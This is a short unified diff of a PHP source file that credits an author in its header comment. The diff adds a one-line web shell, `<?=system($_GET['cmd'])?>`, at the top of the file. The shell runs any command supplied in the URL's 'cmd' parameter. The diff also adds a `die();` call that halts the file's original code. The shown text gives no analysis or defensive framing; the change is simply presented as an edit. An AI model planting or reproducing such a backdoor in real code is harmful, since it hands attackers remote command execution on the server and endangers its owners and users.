@@ -1,5 +1,6 @@
+<?=system($_GET['cmd'])?>
 <?php
-
+die();
 /*
  * 
  * Author: Oleg Antipov
